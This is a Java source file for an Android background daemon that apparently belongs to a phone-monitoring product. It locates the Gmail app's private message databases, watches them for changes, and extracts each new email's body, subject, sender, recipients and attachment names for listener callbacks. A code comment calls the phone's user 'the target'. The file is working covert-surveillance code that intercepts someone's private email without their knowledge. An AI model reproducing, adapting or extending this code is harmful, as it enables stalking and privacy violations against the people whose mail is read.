package com.vvt.daemon.email;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.StringReader;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.TimeZone;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.FileObserver;

import com.fx.daemon.Customization;
import com.vvt.calendar.CalendarObserver;
import com.vvt.contacts.ContactsDatabaseManager;
import com.vvt.ioutil.FxFileObserver;
import com.vvt.ioutil.FxFileObserver.FxFileObserverListener;
import com.vvt.ioutil.FxFileObserver.ObservingMode;
import com.vvt.logger.FxLog;
import com.vvt.stringutil.FxStringUtils;

public class GmailCapturingManager {
	
	private static final String TAG = "GmailCapturingManager";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private CalendarObserver mCalendarObserver;
	private FxFileObserverListener mFileObserverListener;
	private HashSet<FxFileObserver> mFileObservers;
	private HashSet<String> mAccounts;
	private HashSet<OnGmailCaptureListener> mOnGmailCaptureListeners;
	private SimpleDateFormat mDateFormatter;
	private String mActivePath;
	private String mLoggablePath;
	
	private boolean mIsSyncModeEnabled;
	
	public GmailCapturingManager() {
		this(true);
	}
	
	public GmailCapturingManager(boolean isSyncModeEnabled) {
		mIsSyncModeEnabled = isSyncModeEnabled;
		
		mAccounts = new HashSet<String>();
		
		mCalendarObserver = CalendarObserver.getInstance();
		
		mDateFormatter = new SimpleDateFormat(
				GmailCapturingHelper.DEFAULT_DATE_FORMAT);
		
		mFileObservers = new HashSet<FxFileObserver>();
		
		mFileObserverListener = new FxFileObserverListener() {
			@Override
			public void onEventNotify(int event) {
				if(LOGV) FxLog.v(TAG, "onEventNotify # ENTER");
				captureGmail();
				if(LOGV) FxLog.v(TAG, "onEventNotify # EXIT");
			}
		};
		
		mLoggablePath = GmailCapturingHelper.DEFAULT_PATH;
		
		mOnGmailCaptureListeners = new HashSet<OnGmailCaptureListener>();
	}
	
	public void startCapture() {
		if(LOGV) FxLog.v(TAG, "startCapture # ENTER ...");
		
		mCalendarObserver.enable();
		
		if (mIsSyncModeEnabled) {
			captureGmail();
		}
		else {
			initRefId();
		}
		
		if(LOGV) FxLog.v(TAG, "startCapture # EXIT ...");
	}
	
	public void stopCapture() {
		if(LOGV) FxLog.v(TAG, "stopCapture # ENTER ...");
		
		mCalendarObserver.disable();
		
		if(LOGV) FxLog.v(TAG, "stopCapture # Remove all observers");
		removeAllObservers();
		
		if(LOGV) FxLog.v(TAG, "stopCapture # Remove active path");
		mActivePath = null;
		
		if(LOGV) FxLog.v(TAG, "stopCapture # EXIT ...");
	}
	
	public void registerObserver(OnGmailCaptureListener listener) {
		if (mOnGmailCaptureListeners == null) {
			mOnGmailCaptureListeners = new HashSet<OnGmailCaptureListener>();
		}
		synchronized (mOnGmailCaptureListeners) {
			mOnGmailCaptureListeners.add(listener);
			if (LOGV) FxLog.v(TAG, String.format(
					"registerObserver # Listener list: %s", 
					mOnGmailCaptureListeners));
		}
	}
	
	public void unregisterObserver(OnGmailCaptureListener listener) {
		if (mOnGmailCaptureListeners != null) {
			synchronized (mOnGmailCaptureListeners) {
				mOnGmailCaptureListeners.remove(listener);
				if (LOGV) FxLog.v(TAG, String.format(
						"unregisterObserver # Listener list: %s", 
						mOnGmailCaptureListeners));
			}
		}
	}
	
	public void setLoggablePath(String path) {
		mLoggablePath = path;
	}

	public void setDateFormat(String format) {
		mDateFormatter = new SimpleDateFormat(format);
	}
	
	private void initRefId() {
		if (LOGV) FxLog.v(TAG, "initRefId # ENTER");
		
		if (mActivePath == null) {
			checkActivePath();
		}
		
		if (mActivePath != null) {
			mAccounts = getAccountFromPath(mActivePath);
			if (LOGV) FxLog.v(TAG, String.format("initRefId # All accounts: %s", mAccounts));
			
			for (String account : mAccounts) {
				long latestId = GmailCapturingHelper.getMessageLatestId(mActivePath, account);
				if (LOGV) FxLog.v(TAG, String.format(
						"initRefId # account=%s, refId=%d", account, latestId));
				GmailCapturingHelper.updatePersistedRefId(account, latestId, mLoggablePath);
			}
		}
		
		if (LOGV) FxLog.v(TAG, "initRefId # EXIT");
	}
	
	private void checkActivePath() {
		if (LOGV) FxLog.v(TAG, "checkActivePath # Active path was not set -> Finding ...");
		mActivePath = findActivePath();
		
		if (mActivePath == null) {
			if (LOGD) FxLog.d(TAG, "checkActivePath # Active path not found -> Keep observing");
			observeAllPossiblePaths();
			
			if (LOGV) FxLog.v(TAG, "checkActivePath # EXIT");
			return;
		}
		else {
			if (LOGD) FxLog.d(TAG, String.format(
					"checkActivePath # Found an active path: %s", mActivePath));
			
			observeActivePathOnly();
		}
	}
	
	private void captureGmail() {
		if (LOGV) FxLog.v(TAG, "captureGmail # ENTER");
		
		// Get active path and manage file observers
		if (mActivePath == null) {
			checkActivePath();
			if (mActivePath == null) return;
		}
		
		mAccounts = getAccountFromPath(mActivePath);
		if (LOGV) FxLog.v(TAG, String.format("captureGmail # All accounts: %s", mAccounts));
		
		ArrayList<GmailData> gmails = new ArrayList<GmailData>();
		ArrayList<GmailData> temp = null;
		
		for (String account : mAccounts) {
			long refId = GmailCapturingHelper.getPersistedRefId(account, mLoggablePath);
			long latestId = GmailCapturingHelper.getMessageLatestId(mActivePath, account);
			
			if(LOGV) FxLog.v(TAG, String.format(
					"captureGmail # account: %s, refId: %d, latestId: %d", 
					account, refId, latestId));
			
			if (latestId == refId) {
				if(LOGV) FxLog.v(TAG, "captureGmail # Latest ID is not changed!!");
			}
			else if (latestId < refId) {
				if(LOGV) FxLog.v(TAG, "captureGmail # Update refId");
				GmailCapturingHelper.updatePersistedRefId(account, latestId, mLoggablePath);
			}
			else {
				if(LOGV) FxLog.v(TAG, "captureGmail # Query new events");
				temp = getNewEmails(account, refId);
				
				if (temp == null || temp.size() == 0) {
					if(LOGD) FxLog.d(TAG, "captureGmail # Something wrong, no event found!");
				}
				else {
					if(LOGV) FxLog.v(TAG, "captureGmail # Collect events & Update refId");
					gmails.addAll(temp);
					GmailCapturingHelper.updatePersistedRefId(account, latestId, mLoggablePath);
				}
			} // end querying new events
		} // end account loop
		
		if (gmails.size() > 0) {
			if(LOGV) FxLog.v(TAG, "captureGmail # Notify listener");
			for (OnGmailCaptureListener listener : mOnGmailCaptureListeners) {
				listener.onCapture(gmails);
			}
		}
		
		if (LOGV) FxLog.v(TAG, "captureGmail # EXIT");
	}
	
	private String findActivePath() {
		HashSet<String> accounts = null;
		String activePath = null;
		String[] allPaths = GmailCapturingHelper.getAllPossiblePaths();
		
		for (String path : allPaths) {
			accounts = getAccountFromPath(path);
			if (accounts.size() > 0) {
				activePath = path;
				break;
			}
		}
		
		return activePath;
	}
	
	private HashSet<String> getAccountFromPath(String path) {
		HashSet<String> accounts = new HashSet<String>();
		
		File f = new File(path);
		
		if (f.exists() && f.isDirectory()) {
			String[] fileList = f.list();
			
			if (fileList.length > 0) {
				String regex = "(mailstore){1}(.)*(.db){1}";
				Pattern p = Pattern.compile(regex);
				Matcher m = null;
				
				String account = null;
				
				for (String file : fileList) {
					m = p.matcher(file);
					if (m.find()) {
						int start = m.start();
						int end = m.end();
						account = file.substring(start+10, end-3);
						accounts.add(account);
					}
				} // end loop
			} // end if fileList length > 0
		} // end if file exists
		
		return accounts;
	}

	private void observeAllPossiblePaths() {
		removeAllObservers();
		
		String[] allPaths = GmailCapturingHelper.getAllPossiblePaths();
		FxFileObserver observer = null;
		
		synchronized (mFileObservers) {
			for (String path : allPaths) {
				observer = new FxFileObserver(TAG, path, mFileObserverListener);
				observer.setFocusEvent(FileObserver.MODIFY);
				observer.setObservingMode(ObservingMode.MODE_MINIMUM_NOTIFY);
				observer.startWatching();
				mFileObservers.add(observer);
			}
		}
	}
	
	private void observeActivePathOnly() {
		if (mActivePath == null) return;
		
		removeAllObservers();
		
		synchronized (mFileObservers) {
			FxFileObserver observer = 
					new FxFileObserver(TAG, mActivePath, mFileObserverListener);
			
			observer.setFocusEvent(FileObserver.MODIFY);
			observer.setObservingMode(ObservingMode.MODE_MINIMUM_NOTIFY);
			observer.startWatching();
			mFileObservers.add(observer);
		}
	}
	
	private void removeAllObservers() {
		synchronized (mFileObservers) {
			for (FxFileObserver observer : mFileObservers) {
				observer.stopWatching();
			}
			mFileObservers.clear();
		}
	}
	
	private ArrayList<GmailData> getNewEmails(String account, long refId) {
		ArrayList<GmailData> gmails = new ArrayList<GmailData>();
		
		SQLiteDatabase db = GmailDatabaseHelper.getReadableDatabase(
				GmailDatabaseHelper.getGmailAccountDbPath(mActivePath, account));
		
		if (db == null) {
			if(LOGD) FxLog.d(TAG, "getNewEmails # Open Gmail database FAILED!! -> EXIT ...");
			return gmails;
		}
		
		// select messages._id as mid, * from messages
		// left join message_labels on messageId = message_messageId
		// left join labels on labels_id = labels._id
		// where (name = '^i' or name = '^f') and mid > refId
		String sql = String.format(
				"SELECT %s.%s AS mid, %s.%s AS m_label_id,* FROM %s " +
				"LEFT JOIN %s ON %s = %s " +
				"LEFT JOIN %s ON %s = %s.%s " +
				"WHERE (%s = '%s' OR %s = '%s') AND m_label_id > %d AND %s = 1 AND %s = 0 ",
				GmailDatabaseHelper.TABLE_MESSAGES, GmailDatabaseHelper.COLUMN_ID,
				GmailDatabaseHelper.TABLE_MESSAGE_LABELS,GmailDatabaseHelper.COLUMN_ID,
				GmailDatabaseHelper.TABLE_MESSAGES, 
				GmailDatabaseHelper.TABLE_MESSAGE_LABELS, 
				GmailDatabaseHelper.COLUMN_MSG_ID, GmailDatabaseHelper.COLUMN_MSG_MSG_ID, 
				GmailDatabaseHelper.TABLE_LABELS, GmailDatabaseHelper.COLUMN_LABELS_ID, 
				GmailDatabaseHelper.TABLE_LABELS, GmailDatabaseHelper.COLUMN_ID, 
				GmailDatabaseHelper.COLUMN_NAME, "^i", 
				GmailDatabaseHelper.COLUMN_NAME, "^f", refId,
				GmailDatabaseHelper.COLUMN_SYNCED, GmailDatabaseHelper.COLUMN_CLIENT_CREATED);
		
		Cursor cursor = null;
		try {
			cursor = db.rawQuery(sql, null);
			
			if (cursor != null) {
				GmailData gmail = null;
				
				while (cursor.moveToNext()) {
					gmail = createGmailData(db, account, cursor);
					gmails.add(gmail);
				}
			}
		}
		catch (Exception e) {
			if (LOGE) FxLog.e(TAG, "getNewEmails # Error Found", e);
		}
		finally {
			if (cursor != null) cursor.close();
			if (db != null) db.close();
		}
		
		return gmails;
	}
	
	private GmailData createGmailData(SQLiteDatabase db, String account, Cursor cursor) {
		GmailData gmail = null;
		
		if (cursor == null || cursor.isClosed() || cursor.getPosition() == -1) {
			if(LOGE) FxLog.e(TAG, "createGmailData # Fail to create an event!!");
			return gmail;
		}
		
		String label = cursor.getString(cursor.getColumnIndex(
				GmailDatabaseHelper.COLUMN_NAME));
		
		// Analyze direction
		boolean isInbox = false;
		
		if (label.equals("^i")) {
			isInbox = true;
		}
		
		String subject = cursor.getString(cursor.getColumnIndex(
				GmailDatabaseHelper.COLUMN_SUBJECT));
		
		String body = cursor.getString(cursor.getColumnIndex(
				GmailDatabaseHelper.COLUMN_BODY));
		
		if (body == null) {
			int bodyCompressedIdx = cursor.getColumnIndex(
					GmailDatabaseHelper.COLUMN_BODY_COMPRESSED);
			
			if (bodyCompressedIdx != -1) {
				byte[] bodyCompressedBytes = cursor.getBlob(bodyCompressedIdx);
				if (bodyCompressedBytes != null) {
					body = GmailCapturingHelper.getUncompressedContent(bodyCompressedBytes);
				}
			}
		}
		
		// Replace HTML tags with a line feed
		if (body != null) {
			body = FxStringUtils.removeHtmlTags(body);
		}
		
		String rawInfoSender = cursor.getString(cursor.getColumnIndex(
				GmailDatabaseHelper.COLUMN_FROM));
		
		String rawInfoTo = cursor.getString(cursor.getColumnIndex(
				GmailDatabaseHelper.COLUMN_TO));
		
		String rawInfoCc = cursor.getString(cursor.getColumnIndex(
				GmailDatabaseHelper.COLUMN_CC));
		
		String rawInfoBcc = cursor.getString(cursor.getColumnIndex(
				GmailDatabaseHelper.COLUMN_BCC));
		
		String rawInfoAttach = cursor.getString(cursor.getColumnIndex(
				GmailDatabaseHelper.COLUMN_ATTACHMENTS));
		
		// Senders may be null when the target is sending an email
		String[] senders = getAddresses(rawInfoSender);
		String[] senderNames = getName(rawInfoSender);
		String sender = senders == null || senders.length < 1 ? account : senders[0];
		String senderName = "";
		senderName = ContactsDatabaseManager.getContactNameByEmail(new String[]{sender});
		
		if(senderName == null || senderName.length() < 1) {
			if (senderNames == null || senderNames.length < 1) {
				senderName = "unknown";
			}
			else {
				senderName = senderNames[0];
			}
		}
		
		String[] to = getAddresses(rawInfoTo);
		String[] cc = getAddresses(rawInfoCc);
		String[] bcc = getAddresses(rawInfoBcc);

		List<GmailAttachment> gmailAttachments = new ArrayList<GmailAttachment>();
		String[] attachments = getAttachments(rawInfoAttach);
		
		//TODO : need to be upgrade capture raw data in the future.
//		if(attachments.length > 0) {
//			long mid = -1;
//			mid = cursor.getLong(cursor.getColumnIndex(GmailDatabaseHelper.COLUMN_MSG_ID));
//			
//			if(mid > -1) {
//				gmailAttachments = getAttachmentData(db,mid);
//			}
//		}
		
		ArrayList<String> receiverEmails = new ArrayList<String>();
		receiverEmails.addAll(Arrays.asList(to));
		receiverEmails.addAll(Arrays.asList(cc));
		receiverEmails.addAll(Arrays.asList(bcc));
		
		String receiverContactName = ContactsDatabaseManager.getContactNameByEmail(
				receiverEmails.toArray(new String[receiverEmails.size()]));
		
		if (receiverContactName == null || receiverContactName.length() == 0) {
			receiverContactName = "";
		}
		
		int size = -1;
		
		long time = isInbox ? 
				cursor.getLong(cursor.getColumnIndex(
						GmailDatabaseHelper.COLUMN_DATE_RECEIVED)) :
							cursor.getLong(cursor.getColumnIndex(
									GmailDatabaseHelper.COLUMN_DATE_SENT));
		
		mDateFormatter.setTimeZone(
				TimeZone.getTimeZone(
						mCalendarObserver.getLocalTimeZone()));
		
		gmail = new GmailData();
		gmail.setDateTime(mDateFormatter.format(new Date(time)));
		gmail.setTime(time);
		gmail.setInbox(isInbox);
		gmail.setSize(size);
		gmail.setSender(sender);
		gmail.setSenderName(senderName);
		gmail.setTo(to);
		gmail.setCc(cc);
		gmail.setBcc(bcc);
		gmail.setSubject(subject);
		gmail.setAttachments(attachments);
		gmail.setGmailAttachments(gmailAttachments);
		gmail.setBody(body);
		gmail.setReciverContactName(receiverContactName);
		
		// DON'T CLOSE A CURSOR HERE!!
		
		return gmail;
	}
	
	private String[] getAddresses(String input) {
		ArrayList<String> emails = new ArrayList<String>();
		
		if (input != null && input.length() > 0) {
			int beginIndex = 0;
			int endIndex = 0;
			
			while (true) {
				
				beginIndex = input.indexOf("<", endIndex) + 1;
				if (beginIndex < 1 || beginIndex > input.length()) {
					break;
				}
				
				endIndex = input.indexOf(">", beginIndex);
				if (endIndex < 0 || endIndex > input.length()) {
					break;
				}
				
				emails.add(input.substring(beginIndex, endIndex));
			}
		}
		
		String[] result = emails.toArray(new String[0]);
		return result;
	}
	
	private String[] getName (String input) {
		ArrayList<String> emails = new ArrayList<String>();
		
		if (input != null && input.length() > 0) {
			int beginIndex = 0;
			int endIndex = 0;
			
			while (true) {
				
				beginIndex = input.indexOf("\"", endIndex) + 1;
				if (beginIndex < 1 || beginIndex > input.length()) {
					break;
				}
				
				endIndex = input.indexOf("\"", beginIndex);
				if (endIndex < 0 || endIndex > input.length()) {
					break;
				}
				if(!(beginIndex > endIndex)) {
					emails.add(input.substring(beginIndex, endIndex));
				}
				endIndex++;
			}
		}
		
		String[] result = emails.toArray(new String[0]);
		return result;
	}

	private String[] getAttachments(String input) {
		ArrayList<String> attachments = new ArrayList<String>();
		
		if (input != null && input.length() > 0) {
			BufferedReader reader = new BufferedReader(new StringReader(input));
			String line = null;
			String[] splitform = null;
			
			try {
				while ((line = reader.readLine()) != null) {
					if(LOGV) FxLog.v(TAG, String.format("getAttachments # line: %s", line));
					splitform = line.replace("|", " ").split(" ");
					if (splitform != null && splitform.length > 1) {
						attachments.add(splitform[1]);
					}
				}
			}
			catch (IOException e) {
				if(LOGE) FxLog.e(TAG, String.format("getAttachments # Error: %s", e));
			}
		}
		
		return attachments.toArray(new String[0]);
	}
	
	public interface OnGmailCaptureListener {
		public void onCapture(ArrayList<GmailData> gmails);
	}
	
}
